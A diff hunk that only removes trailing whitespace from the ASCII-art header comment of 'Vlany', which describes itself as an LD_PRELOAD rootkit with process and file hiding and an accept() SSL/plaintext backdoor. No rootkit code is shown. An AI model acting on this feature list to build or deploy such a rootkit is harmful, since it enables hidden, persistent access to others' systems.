@@ -1,12 +1,12 @@
-/* 
- *                                                                                       
+/*
+ *
  *    ██╗   ██╗██╗      █████╗ ███╗   ██╗██╗   ██╗
  *    ██║   ██║██║     ██╔══██╗████╗  ██║╚██╗ ██╔╝
- *    ██║   ██║██║     ███████║██╔██╗ ██║ ╚████╔╝ 
- *    ╚██╗ ██╔╝██║     ██╔══██║██║╚██╗██║  ╚██╔╝  
- *     ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║   
- *      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
- *                                           
+ *    ██║   ██║██║     ███████║██╔██╗ ██║ ╚████╔╝
+ *    ╚██╗ ██╔╝██║     ██╔══██║██║╚██╗██║  ╚██╔╝
+ *     ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║
+ *      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝
+ *
  *  LD_PRELOAD rootkit for x86, x86_64, and ARM architectures
  *  complete with gid based process hiding,
  *                xattr based file hiding,
@@ -19,7 +19,7 @@
  *                accept() SSL/plaintext backdoor,
  *                easy-to-use installation script,
  *                incredibly robust configuration
- *                     
+ *
  *  -- EXPERIMENTAL PROJECT..CODE SUBJECT TO CHANGE --
  *  --     WATCH OUT FOR NASTY VERSIONS OF VLANY    --
  *
